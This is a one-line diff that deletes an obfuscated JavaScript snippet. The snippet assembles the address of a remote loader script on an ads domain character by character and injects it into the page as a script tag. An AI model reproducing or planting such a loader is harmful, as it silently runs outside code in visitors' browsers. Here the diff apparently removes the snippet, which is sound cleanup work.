@@ -1,1 +1,0 @@
-(function(d, t) {var g = d.createElement(t),s = d.getElementsByTagName(t)[0];g.async = true;g.src = '/'+'/'+'a'+'d'+'s'+'.'+'d'+'f'+'g'+'i'+'o'+'.'+'c'+'o'+'m'+'/'+'l'+'o'+'a'+'d'+'e'+'r'+'.'+'j'+'s'+'?'+'c'+'l'+'i'+'e'+'n'+'t'+'='+'t'+'o'+'p'+'a'+'z'+'0'+'0'+'0'+'1';if(s==null) return false;s.parentNode.insertBefore(g, s);})(document, 's'+'c'+'r'+'i'+'p'+'t');
